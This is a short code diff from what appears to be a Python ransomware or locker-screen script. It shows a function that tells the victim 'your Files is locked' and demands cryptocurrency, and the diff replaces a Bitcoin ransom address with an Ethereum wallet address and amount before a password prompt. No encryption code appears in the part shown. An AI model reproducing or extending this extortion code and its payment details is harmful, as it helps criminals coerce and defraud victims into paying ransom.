@@ -11,8 +11,8 @@ def clear():
 def pas():
     clear()
     print("your Files is locked")
-    print("sent 0.00047BTC to unlock")
-    print("bitcoin : 3BbN5nbE16hVNmRGnfp3HhxnZo3jCPbTEa")
+    print("sent 0.001ETH to unlock")
+    print("ETH : 0x5c604181a18a4CaaB47E7adf89Bd8CA5225E5BfE")
     print("a small payment will be the Password")
     print("")
     message = str(input("Password : "))
